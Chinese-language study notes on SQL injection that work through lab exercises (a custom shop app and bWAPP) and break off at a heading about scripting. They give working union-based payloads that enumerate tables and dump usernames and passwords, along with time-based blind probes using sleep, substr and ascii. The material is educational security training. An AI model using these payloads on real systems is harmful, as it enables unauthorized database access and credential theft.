## SQL注入是什么
### SQL注入漏洞是什么
是发生于应用程序与数据库层的安全漏洞。 网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。

### GET型SQL注入漏洞是什么
我们在提交网页内容时候，主要分为GET方法，POST方法，GET方法提交的内容会显现在网页URL上，通过对URL连接进行构造，可以获得超出权限的信息内容。

### Web程序三层架构：
**界面层+业务逻辑层+数据访问层**
![[Pasted image 20250124163733.png]]
SQL注入发生在数据访问阶段，**没有网页也能注入**，只要有个服务端服务器接口就行

### 原理
```mysql
SELECT * FROM t1 WHERE NAME = '%s';# %s是前面传过来的
```
正常用户比如输入John，拼出来的结果是：
```mysql
SELECT * FROM t1 WHERE NAME = 'John';
```
若输入`John' or 1 = 1 -- `，拼出来的结果是：
```mysql
SELECT * FROM t1 WHERE NAME = 'John' or 1 = 1 -- ';
```
也就是：
```mysql
SELECT * FROM t1;
```

### 直观SQL注入演示：
![[Pasted image 20250124164915.png]]
![[Pasted image 20250124165203.png]]
### SQL注入带来的威胁
1. 猜解后台数据库，盗取网站敏感信息
2. 绕过验证登录网站后台
3. 借助数据库的存储过程进行提权等操作

## SQL注入的关键点
- 检索隐藏数据
- 修改应用程序逻辑
- Union attack
- 获取敏感数据

## SQL注入实例1——获取隐藏数据
原始数据：
![[Pasted image 20250124171337.png]]
product表中有五个字段：id,name,released,category,content
> category 商品类型
> released 商品是否发布（0为已发布）

进入界面是这样的：
![[Pasted image 20250124172131.png]]
输入Gifts：
![[Pasted image 20250124172621.png]]
此时F12->网络（Network）->XHR   刷新后出现一个：
![[Pasted image 20250124172919.png]]
点他后，再选择Headers：
![[Pasted image 20250124173153.png]]
看到`&released=0`，即**正常只能搜索出已发布的商品**
### 需求1：我们现在要得到所有的商品（包括未发布）
通过URL开始分析：
输入Gifts会拼出：
```mysql
SELECT id,name,content,released FROM products WHERE category = 'Gifts' and released = 0;
```
其中的`products`是**猜想**的，`id,name,content,released`是通过**页面**看出来的
关键点在于**让and released = 0不起作用**
那我们**输入`Gifts'-- `或者`Gifts'#`**:
![[Pasted image 20250124174158.png]]
拼出的是：
```mysql
SELECT id,name,content,released FROM products WHERE category = 'Gifts'-- ' and released = 0;
```
> 多传入的`'`是为了让单引号闭合

### 陌生网站怎么做？
**先直接输入`'`**
F12->网络（Network）->XHR ，点击出现的请求后选response
**如果报错99.999%存在SQL注入**


### 需求2：我们现在要拿到所有商品，所有Content
输入aaaa会拼出：
```mysql
SELECT id,name,content,released FROM products WHERE category = 'aaaa' and released = 0;
```
我们不可能把category干掉，因为我们只能动单引号内的内容，不可能在category前加注释号
输入`Gifts' or 2=2 -- `会拼出：
```mysql
SELECT id,name,content,released FROM products WHERE category = 'Gifts' or 2=2 -- ' and released = 0;
```
因为有`or`的存在，2=2成立，where后的条件直接失效，**改变了语句逻辑**
语句也就等效于：
```mysql
SELECT id,name,content,released FROM products;
```
结果：
![[Pasted image 20250126205335.png]]

### 需求3：拿到所有的用户名和密码并登陆系统
![[Pasted image 20250127114922.png]]
思路：
先用`select database()`看看我们在哪个数据库，然后我们再拿到我们的表（table），然后我们就可以拿到字段，然后分析字段有没有我们需要的username和password

有回显->可以使用**union attack**

先用sql演示一下：
![[Pasted image 20250127115854.png]]
1，2，3，4，5没有什么实际意义，但是可以看出是一一对应的关系
我们将其用`database() version() user()`**代替**试试，尽量不改变数据类型
于是输入：
```mysql
select * from `products` union select 1,user(),3,version(),database();
```
结果：
![[Pasted image 20250127120643.png]]
几个重要信息就显示出来了

然后通过库名查表名：
输入：
```mysql
select table_name from information_schema.tables where table_schema='sql_inject'
或
select table_name from information_schema.tables where table_schema=database()
```
结果：
![[Pasted image 20250127122447.png]]


开始注入：
输入`Gifts' union select 1,2 #`
此时应该会报错，前端并没有给我们展示出来
我们还是去**Network->找到刚刚发送的请求->Response**，里面就有报错
输入`Gifts' union select 1,2，3，4 #`，拼出：
```mysql
SELECT id,name,content,released FROM products WHERE category = 'Gifts' union select 1,2,3,4 #' and released = 0;
```
结果是：
![[Pasted image 20250127121302.png]]
觉得前面那些商品碍眼，就不搜Gifts，搜个没有的就行，比如a
结果就比较干净：
![[Pasted image 20250127121355.png]]
Id和Released都是整型类型，user和database都是字符串类型的，那就尽量选择数据类型相同的Name和Content（否则会报错）
输入`1' union select 1,database(),user(),4 -- `
结果：
![[Pasted image 20250127121701.png]]
得到库名，注入获取表名：
输入`1' union select 1,database(),table_name,4 from information_schema.tables where table_schema = database() -- `
拼出：
```mysql
SELECT id,name,content,released FROM products WHERE category = 'Gifts' union select 1,database(),table_name,4 from information_schema.tables where table_schema = database() #' and released = 0;
```
结果是：
![[Pasted image 20250127123030.png]]
我们要的当然不是products那张表，应该是user这张表，我们要把他的所有字段拿出来
稍作修改：
传入：`1' union select 1,database(),column_name,4 from information_schema.columns where table_name = 'user' -- `
结果是：
![[Pasted image 20250127124139.png]]
这个结果一定**不对**，因为我们看到查出来了`Host User`还有很多权限
这和`select user,host from mysql.user`的结果一样
当时他也包含了products库中的user表的内容，在最下面：
![[Pasted image 20250127124428.png]]
也就是说出现同名表，都叫user，就将他们的字段全部查出来了
那我们就再加一个条件：
`1' union select 1,database(),column_name,4 from information_schema.columns where table_name = 'user' and table_schema=database()-- `
结果：
![[Pasted image 20250127125537.png]]
就知道有哪些字段了
接下来要把他们查出来
输入：`1' union select 1,user_name,password,4 from user #`
结果：
![[Pasted image 20250127125828.png]]
使用账号密码登录即可

## SQL注入实例2
>bWAPP_SQL Injection (POST/Select)\_low

![[Pasted image 20250201232615.png]]
![[Pasted image 20250201232629.png]]
域名中没有各个参数的值，我们F12进入网络，再次点击Go，选中php文件，可以在消息头中看到是POST传参，在请求中可以看到传入的值
我们可以用各个工具进行POST传参，这里使用Hackbar
![[Pasted image 20250201233045.png]]
改变movie的值就可以改变显示的电影
![[Pasted image 20250201233151.png]]
可以在源码中看到一共有十个选项

### 需求1：拿到当前登录数据库的用户名和当前数据库的名称
这题因为输入的是**数字类型**，不是之前的字符串类型，**无需加单引号**
猜测后端SQL语句为：（更直观看下为什么不用单引号）
```mysql
select * from user where movie = 1;
```
使用**联合注入**试试：
输入`movie=1 union select 1,2,3,4,5,6,7 #`
结果：![[Pasted image 20250201234423.png]]
咋没效果？可能是服务端做了限制，只会返回一条，也就是后端为：
```mysql
select * from user where movie = 3 limit 1;
```
那改成`movie=100 union select 1,2,3,4,5,6,7 #`，这样movie就搜不出来了
movie只要不传`1-10`就行
结果：
![[Pasted image 20250201234556.png]]
有回显了
可以查查东西
注意：**movie和=中间不要加空格**
输入：`movie=100 union select 1,database(),user(),4,version(),6,7 #`
结果：
![[Pasted image 20250201235243.png]]

### 需求2：拿到账号密码
最重要的是**库名**，有了库名我们就可以拿到表名，从而拿到字段，进而查询
可是由于`limit`的限制，我们只能拿到一个数据，那当有多个表名的时候我们只能查出来一个，这怎么办呢？
#### 法一
仍然**利用limit**：
`limit 0,1`：从第0条数据往后显示1条，即第1条数据
`limit 1,1`：从第1条数据往后显示1条，即第2条数据
`limit 2,1`：从第2条数据往后显示1条，即第3条数据
以此类推

输入：`movie=100 union select 1,database(),user(),4, table_name,6,7 from information_schema.tables where table_schema=database() limit 0,1#`
结果：
![[Pasted image 20250202210208.png]]
把0改作1，2，3……
表名：blog，heroes，movies，users，visitors……
users可能是我们想要的，查查他的字段，输入：
`movie=100 union select 1,database(),user(),4,column_name,6,7 from information_schema.columns where table_name='users' limit 0,1#`
依旧修改limit，得到几个字段名：id，login，password，email……
login和password可能是我们想要的，查一下，输入：
`movie=100 union select 1,database(),user(),4,login,6,7 from users limit 0,1#`
结果：
![[Pasted image 20250202210733.png]]
再查下密码：`movie=100 union select 1,database(),user(),4,password,6,7 from users limit 0,1#`
结果：
![[Pasted image 20250202210841.png]]
cmd5解码后是`bug`，即可登录

#### 法二
像刚刚那样一个一个修改limit的数值非常麻烦，这里再介绍一个MySQL的函数
##### 函数GROUP_CONCAT()
>concat专注于拼接以行（字段）为单位，group_concat则专注于拼接以列（同一字段的多个内容）为单位

比如在实例一的环境下：
```mysql
select group_concat(content) from `products`
```
输出：
![[Pasted image 20250202211207.png]]
与之对比的，如果不用`group_concat()`的结果是：
![[Pasted image 20250202211256.png]]
##### 注入：
于是我们获取表名可以这么写：`movie=100 union select 1,database(),user(),4, group_concat(table_name),6,7 from information_schema.tables where table_schema=database() #`
结果：![[Pasted image 20250202211457.png]]
显示在一起了，比较方便快捷
然后我们要获取users中的字段，输入：`movie=100 union select 1,database(),user(),4,group_concat(column_name),6,7 from information_schema.columns where table_name='users'#`
结果（没放全）：
![[Pasted image 20250202211923.png]]
有用的就login和password
查：`movie=100 union select 1,group_concat(login),group_concat(password),4,5,6,7 from users#`
结果：
![[Pasted image 20250202225249.png]]
以`,`分隔，结果与法一一致，解码登录即可

## 判断SQL注入点
**关键**
> 判断该访问URL是否存在SQL注入
> 如果存在SQL注入，属于哪种SQL注入（重要，只有知道类型才能构造原始SQL语句）

### 经典的单引号判断法
如果输入`'`报错，报SQL语法错误，说明后端是拼接SQL语句，没有进行过滤，那么99%有SQL注入漏洞
但如果没有回显就不好使，就要用到**盲注**

### 通常SQL注入类型分为两种类型，一种字符串类型，一种数字类型
**数字型**
```mysql
select * from table_name where id = 1;
构造：
select * from table_name where id = 1 and 1 = 1;
```
**字符型**
```mysql
select * from table_name where id = '1';
构造：
select * from table_name where id = '1' and '1' = '1';
```
#### like语法
^29d2c6

比如在实例一的环境中查找**以T开头的内容**
```mysql
select * from `product` where `name` like 'T%'
```
结果：
![[Pasted image 20250204120915.png]]

比如在实例一的环境中查找**以3结尾的内容**
```mysql
select * from `product` where `name` like '%3'
```
结果：
![[Pasted image 20250204120935.png]]

比如在实例一的环境中查找**包含h的内容**
```mysql
select * from `product` where `name` like '%h%'
```
结果：
![[Pasted image 20250204121042.png]]

所以在下面这个环境中：
[[003 bWAPP_SQL Injection (GET Search)_low]]
输入`a' and '1' = '1`搜不出来结果
输入`a' and '1' = '1'#`搜不出来结果
要输入`a%' and '1' = '1'#`才可以
这就是**要闭合%的情况**
后端拼SQL的语句：
![[Pasted image 20250204121833.png]]
**搜了没回显要关注这些细节**

## SQL注入类型
- Union query SQL injection 有回显一般用这种
- Error-based SQL injection 有回显报错信息，可从中获取想要的信息
- Boolean-based blind SQL injection 布尔盲注，使用or、and等
- Time-based blind SQL injection 最常用的盲注
- Stack queries SQL injection 堆叠注入

## 时间盲注
### 时间盲注是什么
> 通过注入特定语句，根据对页面请求的物理反馈，来判断是否注入成功，如：在SQL语句中使用sleep()函数看加载网页的时间来判断注入点

适用场景：**没有回显**，甚至连注入语句是否执行都无从得知

```mysql
select * from products where category = 'Gifts' and sleep(3)
```
查出**一条语句**会**睡三秒**，如果是四条就是12秒
当category = 'Gifts' 有值的话，休眠3秒；没有值的话，直接返回
给出的物理反馈就是网页非常慢，一直在转，当然也可以在`Network`中看详细响应时间
可以通过输入`... and sleep(2)`来判断`...`的真假或者是否存在SQL注入，就是看网页的响应速度

### 常用函数
功能概述：
```mysql
sleep()
substr()、mid() 分割字符串
length() 求字符串长度
ascii()、ord() 求ascii码
count() 计算总数
left() 从左截取字符串
```
#### 详细用法及举例
##### substr()、mid()
>mid和substr的用法完全一致，是substr的变种，substr被禁时可用，将下面的substr改为mid即可

第二个参数是从第几个字符开始取（1开始），第三个参数是取多少个
如果第三个参数不写，默认取到最后一个
```mysql
select substr('Yunan',1,1) #从第一个开始取一个，输出Y
select substr('Yunan',2,1) #从第二个开始取一个，输出u
select substr('Yunan',2) #从第一个开始取到最后，输出unan
```

使用：
返回1为真，返回0为假，配合sleep使用
```mysql
select substr(database(),1,1) = 'a' and sleep(2) #一个一个试
select substr(database(),2,1) = 'a' and sleep(2)
...
```
但是我们还需要知道**数据库名称的长度**
##### length()
传入字符串，返回字符串长度
```mysql
select length('Yunan') #输出5
```
使用：
```mysql
select length(database())
```
实例：
```mysql
(select length(column_name) from information_schema.columns where table_name='users' and table_schema=database() limit 1,1)=5 and sleep(2)
```
一个个尝试字符串太麻烦了，一般使用脚本来，会用到ASCII码
程序算数字会比字符更快
##### ascii()、ord()
>ord()与ascii()用法一致，被禁时可用

传入字符串，返回**第一个字符**的ASCII码
```mysql
select ascii('Yunan') #输出Y的ASCII码89
```
使用：
```mysql
select ascii(substr(database(),2,1)) = 33 and sleep(3)
```
实例：**先查询再截取**
```mysql
ascii(substr((select column_name from information_schema.columns where table_name='users' and table_schema=database() limit 1,1),1,1))={} and sleep(2)
```
也可以尝试`>、<`等
##### count()
```mysql
select count(*) from user #输出2 查出来就两条数据
```
##### left()
从左往右截取字符串，第二个参数是指截取长度
```mysql
select left('Yunan',2) #输出Yu
```

### SQL注入实例3
>bWAPP_SQL Injection - Blind - Time-Based\_low

输入`1 or sleep(2) #`没反应，因为要电影名，估计是字符串
`1' or sleep(2) #`页面开始转，响应了20s
![[Pasted image 20250219224115.png]]
有十个词条
#### 需求1：获取到数据库名称的长度
用**length()函数**
```mysql
Iron Man' and length(database()) = 1 and sleep(2)#
```
不一定等于1，一个个试
输入`Iron Man' and length(database()) > 5 and sleep(2)#`没转，说明小于等于5
输入`Iron Man' and length(database()) = 5 and sleep(2)#`转了两秒，得到数据库名称的长度为5
太麻烦了，人工要做的只是**找是否存在注入点**，其余交给**脚本**
#### 需求2：获取到数据库名称
用**substr()函数**
输入`Iron Man' and substr(database(),1,1) = 'b' and sleep(2)#`
转了，说明第一个字母是b
这个操作起来可就太麻烦了，还是写脚本吧
#### 编写脚本


